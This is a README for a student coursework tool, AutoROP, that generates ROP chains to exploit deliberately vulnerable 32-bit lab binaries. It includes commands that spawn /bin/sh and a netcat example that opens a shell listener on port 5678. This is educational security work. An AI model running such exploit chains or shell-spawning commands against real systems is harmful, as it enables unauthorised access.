# AutoROP — Automatic ROP exploit generator (COMSM0049)

Hi!
This is a toolset for discovering ROP gadgets, building ROP chains and testing exploits against deliberately vulnerable binaries.

## Project structure

- `vuln_files/` — vulnerable C sources (`vuln1.c` ... `vuln4.c`)
- `binaries/` — compiled 32-bit binaries (`vuln1-32`, ...)
- `gadgetfinder.py` — extract gadget lists from a binary
- `buildropchain.py` — build a ROP chain from a gadget map and commands
- `fuzzing.py` — find offsets/prefixes required before the ROP chain
- `autoROP.py` — brings all above together and runs a built payload against a target binary

Run either `autoROP.py` or `fuzzing.py` with the `--help` arguments to see more details about the various aguments these files take.
## Commands for result recreation

```bash
python3 autoROP.py binaries/vuln1-32 /bin//sh --fileinput 1
```
- vuln1 just takes basic fileinput, omit the arg in order for it to determine the fileinput flag automatically.
```bash
python3 autoROP.py binaries/vuln2-32 /bin//sh --fileinput 0
```
- vuln2 takes input from stdin as the first input.
```bash
python3 autoROP.py binaries/vuln3-32 /bin//sh --fileinput 0 --inputs "y\nn\n"
```
- vuln3 simulates a simple menu that requires y then n to inputted before the overflow.
```bash
python3 autoROP.py binaries/vuln4-32 /bin//sh
```
- vuln4 takes input from stdin as the 4th input, which the program determines automatically, an example of using a library that is assumed to be safe. 
- Example using a local netcat to get a reverse shell 

```bash
python3 autoROP.py binaries/vuln2-32 -- /tmp//nc -lnp 5678 -tte /bin//sh
```
- Run `/tmp/nc 127.0.0.1 5678` in another terminal
- This displays the arbitrary command functionality of the exploit, being able to generate a remote shell as well as arbitary length commands.




## Notes about compilation

Binaries used were compiled on the lab machines with:

```bash
gcc -fno-stack-protector -m32 -static vuln{i}.c -o vuln{i}-32
```

This was done because compiling on other machines produced fewer usable gadgets for the ROP tooling.

## Dependencies

- **Python:** Tested with Python 3 (3.6+).
- **External Python modules:** None — the project uses only the Python standard library.

## Required tools

- ROP gadget extraction is compatible with ROPgadget: https://github.com/JonathanSalwan/ROPgadget
- Latest `gdb` is needed.
- An old `netcat` installation: https://sourceforge.net/projects/netcat/
    This needs to be installed by: 
    - untar it and build: `./configure` and `make` command (do not do make install!)
    - move `src/netcat` to `/tmp/nc`: `cp src/netcat /tmp/nc` (check if the binary is working as expected `/tmp/nc --help`)

## Contact and Thanks
Please email me if there are any issues (os22128@bristol.ac.uk)

Thank you,
Nic















(give me a first please)
